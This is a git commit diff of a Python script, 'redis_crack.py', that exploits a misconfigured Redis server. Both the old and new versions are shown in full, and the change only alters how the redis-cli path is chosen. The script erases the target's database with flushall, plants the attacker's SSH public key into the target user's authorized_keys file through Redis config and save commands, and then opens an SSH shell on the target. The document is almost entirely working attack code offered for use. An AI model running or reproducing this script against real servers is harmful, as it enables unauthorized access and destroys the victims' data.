9e602947434a8c12a36f3cff5d5a41dde5d1a943
lenovo@DESKTOP-198AO90 <1183195926@qq.com>
2019-10-21 17:16:03 +0800

    redis-hack

--- test_env/redis_crack.py
+++ test_env/redis_crack.py
@@ -10,9 +10,7 @@ from termcolor import colored
 
 script, ip_address, port, username = argv
 
-PATH = '/usr/bin/redis-cli'
-PATH1 = '/usr/local/bin/redis-cli'
-PATH2 = '/usr/local/redis/bin/redis-cli'
+REDIS_CLI = "/usr/local/redis3/bin/redis-cli"
 
 
 def ssh_connection():
@@ -20,36 +18,33 @@ def ssh_connection():
     os.system(shell)
 
 
-if os.path.isfile(PATH) or os.path.isfile(PATH1) or os.path.isfile(PATH2):
-    try:
-        print(colored('\t*******************************************************************', "green"))
-        print(colored('\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*', "green"))
-        print(colored('\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                ', "green"))
-        print(colored('\t*******************************************************************', "green"))
-        print("\n")
-        print(colored("\t SSH Keys Need to be Generated", 'blue'))
-        os.system('ssh-keygen -t rsa -C \"acid_creative\"')
-        print(colored("\t Keys Generated Successfully", "blue"))
-        os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
-        # cmd = "redis-cli -h " + ip_address + ' flushall'
-        cmd = "redis-cli -h " + ip_address + " -p " + port + ' flushall'
-        cmd1 = "redis-cli -h " + ip_address + " -p " + port
-        os.system(cmd)
-        cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " + ip_address + " -p " + port + ' -x set cracklist'
-        os.system(cmd2)
-        cmd3 = cmd1 + ' config set dbfilename "backup.db" '
-        cmd4 = cmd1 + ' config set  dir' + " /home/" + username + "/.ssh/"
-        cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
-        cmd6 = cmd1 + ' save'
-        os.system(cmd3)
-        os.system(cmd4)
-        os.system(cmd5)
-        os.system(cmd6)
-        print(colored("\tYou'll get shell in sometime..Thanks for your patience", "green"))
-        ssh_connection()
+try:
+    print(colored('\t*******************************************************************', "green"))
+    print(colored('\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*', "green"))
+    print(colored('\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                ', "green"))
+    print(colored('\t*******************************************************************', "green"))
+    print("\n")
+    print(colored("\t SSH Keys Need to be Generated", 'blue'))
+    os.system('ssh-keygen -t rsa -C \"acid_creative\"')
+    print(colored("\t Keys Generated Successfully", "blue"))
+    os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
+    # cmd = "{} -h " + ip_address + ' flushall'
+    cmd = "{} -h ".format(REDIS_CLI) + ip_address + " -p " + port + ' flushall'
+    cmd1 = "{} -h ".format(REDIS_CLI) + ip_address + " -p " + port
+    os.system(cmd)
+    cmd2 = "cat $HOME/.ssh/public_key.txt | {} -h ".format(
+        REDIS_CLI) + ip_address + " -p " + port + ' -x set cracklist'
+    os.system(cmd2)
+    cmd3 = cmd1 + ' config set dbfilename "backup.db" '
+    cmd4 = cmd1 + ' config set  dir' + " /home/" + username + "/.ssh/"
+    cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
+    cmd6 = cmd1 + ' save'
+    os.system(cmd3)
+    os.system(cmd4)
+    os.system(cmd5)
+    os.system(cmd6)
+    print(colored("\tYou'll get shell in sometime..Thanks for your patience", "green"))
+    ssh_connection()
 
-    except:
-        print("Something went wrong")
-else:
-    print(colored("\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed "
-                  "further.", "red"))
+except:
+    print("Something went wrong")
